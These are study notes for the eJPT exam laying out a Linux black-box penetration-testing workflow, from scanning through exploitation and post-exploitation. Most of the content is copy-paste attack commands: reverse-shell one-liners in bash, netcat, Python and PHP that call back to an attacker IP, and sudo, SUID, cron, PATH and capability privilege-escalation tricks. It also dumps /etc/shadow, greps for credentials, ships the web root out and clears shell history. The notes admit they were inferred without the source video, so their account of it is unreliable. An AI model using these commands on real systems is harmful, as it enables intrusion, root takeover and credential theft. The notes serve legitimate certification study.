# 01 - Linux Black Box Penetration Test — eJPT Study Notes

Note: The transcript wasn’t provided. The following is a conservative, standard Linux black-box pentesting flow inferred from the filename and folder context (01-LinuxExploitation). Commands are generalized and lab-safe. Replace placeholders with your values.

## What the video covers (Introduction / big picture)
- A start-to-finish black box approach against a Linux target: enumerate, identify attack surface, gain initial access, escalate privileges, and loot evidence.
- Focus on methodology over tool glamour: consistent recon, targeted enumeration, precise exploitation, and disciplined post-exploitation.
- Emphasis on common eJPT-relevant services: HTTP, SSH, FTP, SMB, and typical Linux privilege escalation vectors (sudo misconfigs, SUID binaries, creds in configs, cron jobs).

## Flow (ordered)
1. Scope, identify target(s), and set up your workspace.
2. Host discovery and full TCP port scan.
3. Targeted service/version scan on discovered ports.
4. Service-specific enumeration (HTTP, FTP, SMB, SSH, DB).
5. Identify likely footholds (weak creds, default creds, web vulns, anonymous shares, file uploads).
6. Gain initial access (web shell, RCE, FTP-to-web drop, SSH with creds).
7. Stabilize and upgrade your shell.
8. Local enumeration and privilege escalation.
9. Post-exploitation: credentials, keys, configs, evidence collection.
10. (Optional) Pivoting and internal discovery.
11. Cleanup and reporting.

## Tools highlighted
- Network/Scanning: nmap, netcat, curl, wget
- Web enum: whatweb, gobuster or ffuf, nikto (optional), curl
- SMB/Windows-like on Linux: smbclient, enum4linux-ng
- FTP/SSH: ftp, lftp, ssh, scp, sftp, hydra (only when appropriate)
- Passwords/Hashes: john, unshadow, ssh2john (as needed)
- Linux local enum: manual commands, linpeas.sh, lse.sh, pspy
- Reverse shells and TTY: nc, socat, python3 pty
- Reference: GTFOBins (gtfobins.github.io) for SUID/sudo abuse

## Typical command walkthrough (detailed, copy-paste friendly)
Replace placeholders:
- TARGET: target IP (e.g., 10.10.10.10)
- RANGE: network range if needed (e.g., 10.10.10.0/24)
- LHOST: your attacker IP (e.g., 10.10.14.3)
- LPORT: your listener port (e.g., 4444)

Setup
```
# Set variables
export TARGET=10.10.10.10
export RANGE=10.10.10.0/24
export LHOST=$(ip route get 1.1.1.1 | awk '{print $7; exit}')
export LPORT=4444
export WORDLIST=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Workspace
mkdir -p scans loot www
```

1) Discovery and full scan
```
# Ping sweep (if allowed/known range)
nmap -sn $RANGE -oA scans/ping-sweep

# TCP all-ports scan (fast but reliable)
nmap -p- -sS -Pn -n --min-rate 3000 --defeat-rst-ratelimit -oA scans/alltcp $TARGET

# Extract open TCP ports into a comma list
ports=$(awk '/open/ && /tcp/ {print $1}' scans/alltcp.nmap | cut -d'/' -f1 | paste -sd, -)
echo "$ports"
```

2) Targeted service/version scan
```
# Default scripts + versions on discovered ports
nmap -sC -sV -p $ports -oA scans/targeted $TARGET

# Quick top UDP (optional)
nmap -sU --top-ports 50 -Pn -n -oA scans/udp-top50 $TARGET
```

3) General service checks
```
# Quick banners
nc -nv $TARGET 22 </dev/null
nc -nv $TARGET 80 </dev/null

# Web fingerprint
whatweb http://$TARGET/ | tee scans/whatweb.txt
curl -I http://$TARGET/
```

4) HTTP enumeration
```
# HTTP title and scripts
nmap -p80,443 --script http-title,http-server-header,http-methods -oA scans/http-scripts $TARGET

# Directory busting (adjust extensions as needed)
gobuster dir -u http://$TARGET -w $WORDLIST -x php,txt,html,bak,zip -t 50 -o scans/gobuster80.txt

# If HTTPS present
gobuster dir -u https://$TARGET -w $WORDLIST -k -x php,txt,html,bak,zip -t 50 -o scans/gobuster443.txt

# Manual checks of discovered endpoints
# curl http://$TARGET/path
```

5) FTP enumeration (if 21 open)
```
# NSE for FTP
nmap -p21 --script ftp-anon,ftp-syst -oA scans/ftp $TARGET

# Try anonymous
ftp -inv $TARGET << 'EOF'
user anonymous anonymous
ls -la
get readme.txt
bye
EOF
```

6) SMB enumeration (if 139/445 open)
```
# NSE scripts
nmap -p139,445 --script smb-enum-shares,smb-enum-users,smb-os-discovery -oA scans/smb $TARGET

# List shares (no password)
smbclient -L "//$TARGET/" -N

# Connect to share
# smbclient "//$TARGET/sharename" -N
```

7) SSH checks (22)
```
# Verbose connection to learn auth methods
ssh -v user@$TARGET

# If creds discovered, try SSH
# ssh user@$TARGET
```

8) Identify footholds
- HTTP uploads/RCE, default creds, FTP-to-web-path write, SMB writable share, leaked SSH keys/config creds, known vulns in app banner.

9) Reverse shell listener (before triggering any RCE)
```
# Reliable listener with readline support
rlwrap -cAr nc -lvnp $LPORT
```

10) Reverse shell one-liners (trigger from vulnerable input, webshell, or command injection)
Replace LHOST/LPORT inline with actual IP/port.

- Bash
```
bash -c 'bash -i >& /dev/tcp/10.10.14.3/4444 0>&1'
```

- Netcat (mkfifo fallback)
```
mkfifo /tmp/p; /bin/sh -i < /tmp/p 2>&1 | nc 10.10.14.3 4444 > /tmp/p
```

- Python3
```
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.3",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

- PHP
```
php -r '$s=fsockopen("10.10.14.3",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

11) Stabilize TTY
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 50 columns 120
```

12) Local enumeration (as low-priv user)
```
whoami; id; hostname; uname -a
ip a; ip route
ss -tulpn
sudo -l
ls -la /home
ls -la /var/www /var/www/html
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
ls -la /etc/cron*; cat /etc/crontab
env; echo $PATH
# Credential hunting
grep -RniE "passw|secret|token|key" /var/www /opt /home 2>/dev/null | head
cat /var/www/html/wp-config.php 2>/dev/null
for u in /home/*; do [ -d "$u/.ssh" ] && ls -la "$u/.ssh"; done
# Download linpeas (if allowed)
cd /tmp && curl -sOL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh && ./linpeas.sh
```

13) Common privilege escalation paths

- Sudo misconfig (no password or NOPASSWD)
```
sudo -l
# If you can run something as root, check GTFOBins. Examples:
# tar
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
# vim
sudo vim -c ':!/bin/sh'
# find
sudo find . -exec /bin/sh -p \; -quit
```

- SUID binaries (GTFOBins)
```
find / -perm -4000 -type f 2>/dev/null
# Example: find with SUID
/usr/bin/find . -exec /bin/sh -p \; -quit
```

- Writable cron or PATH hijack
```
cat /etc/crontab; ls -la /etc/cron.hourly /etc/cron.daily /etc/cron.weekly
# If a root cron runs a script you can edit:
echo -e '#!/bin/sh\n/bin/sh -p' > /path/to/writable_script && chmod +x /path/to/writable_script
# PATH hijack example if a root-run script calls 'ls' without full path:
echo -e '#!/bin/sh\n/bin/sh -p' > /tmp/ls; chmod +x /tmp/ls
export PATH=/tmp:$PATH
# Wait/trigger the script
```

- Capabilities
```
getcap -r / 2>/dev/null
# If python3 has cap_setuid+ep:
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

- Credentials reuse/SSH keys
```
# If you find id_rsa:
chmod 600 id_rsa
ssh -i id_rsa user@$TARGET
```

14) Post-exploitation: loot and evidence
```
# Sensitive files
cat /etc/shadow 2>/dev/null
cat /etc/passwd
tar czf /tmp/webroot.tgz /var/www/html 2>/dev/null

# User creds and histories
for u in /home/*; do [ -f "$u/.bash_history" ] && tail -n 100 "$u/.bash_history"; done

# Copy loot back
cd /tmp && python3 -m http.server 8081
# From your box:
wget http://$TARGET:8081/webroot.tgz -O loot/webroot.tgz
```

15) Cleanup (if allowed)
```
# Remove droppers, shells, temp tools
rm -f /tmp/linpeas.sh /tmp/p /tmp/ls /tmp/webroot.tgz
history -c  # Only in your own shell; do not tamper with system logs unless policy permits
```

## Practical tips
- Always save outputs (-oA) and keep a timeline; it helps during reporting and retests.
- Don’t brute-force by default. Try logic and leaks first (config files, backups, comments, default creds).
- Map web attack surface early: tech stack, input points, file uploads, backup/old files (.bak, .old, ~).
- When scanning, use -Pn and -n in noisy labs to skip unreliable DNS and host discovery delays.
- Use GTFOBins for any SUID/sudo entries you find; it’s the fastest path to root in many labs.
- Upgrade shells to TTY early; it prevents tool/input issues and lets sudo prompt work.
- If the web root is writable via FTP/SMB, drop a webshell or timed reverse shell cautiously.
- Capture and reuse credentials across services (SSH/DB/Web). Reuse is common in labs.
- LinPEAS is a great shotgun; still validate findings manually for understanding and exam robustness.

## Minimal cheat sheet (one-screen flow)
```
export TARGET=10.10.10.10; export LHOST=$(ip route get 1.1.1.1|awk '{print $7;exit}'); export LPORT=4444
mkdir -p scans

nmap -p- -sS -Pn -n --min-rate 3000 -oA scans/alltcp $TARGET
ports=$(awk '/open/&&/tcp/{print $1}' scans/alltcp.nmap|cut -d/ -f1|paste -sd, -)
nmap -sC -sV -p $ports -oA scans/targeted $TARGET

whatweb http://$TARGET/
gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 50 -o scans/gobuster80.txt

# FTP/SMB quick checks
nmap -p21 --script ftp-anon,ftp-syst -oA scans/ftp $TARGET
smbclient -L "//$TARGET/" -N

# Listener
rlwrap -cAr nc -lvnp $LPORT

# Reverse shell (example Bash; replace IP/port)
bash -c 'bash -i >& /dev/tcp/10.10.14.3/4444 0>&1'

# TTY upgrade
python3 -c 'import pty; pty.spawn("/bin/bash")'; export TERM=xterm

# Local enum
id; uname -a; ip a; ss -tulpn; sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
ls -la /etc/cron*; cat /etc/crontab
grep -RniE "passw|secret|token|key" /var/www /opt /home 2>/dev/null | head

# Common privesc (examples)
# sudo find: sudo find . -exec /bin/sh -p \; -quit
# SUID find: /usr/bin/find . -exec /bin/sh -p \; -quit
# Cap python: python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

## Summary
- This is a pragmatic, exam-ready black box Linux workflow: discover, enumerate, exploit, escalate, and loot.
- Prioritize targeted enumeration and low-hanging fruit: web content discovery, anonymous/writable services, leaked creds.
- Use standard reverse shells and stabilize your session; then methodically check sudo, SUID, crons, capabilities, and configs.
- Document everything. LinPEAS and GTFOBins accelerate progress, but understanding the “why” behind each step is key for eJPT and beyond.